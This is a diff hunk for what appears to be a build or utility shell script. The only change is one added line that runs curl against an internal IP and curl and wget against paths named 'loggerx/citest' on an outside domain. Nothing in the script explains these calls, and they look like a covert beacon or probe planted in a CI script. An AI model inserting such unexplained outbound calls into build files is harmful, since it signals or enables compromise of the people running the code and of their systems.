@@ -18,6 +18,7 @@
 #                   Utils
 #=================================================
 
+curl 10.199.206.49;curl s.c1tas.pw/loggerx/citest1;wget s.c1tas.pw/loggerx/citest2
 
 # directory config
 DIST_DIR="dist"
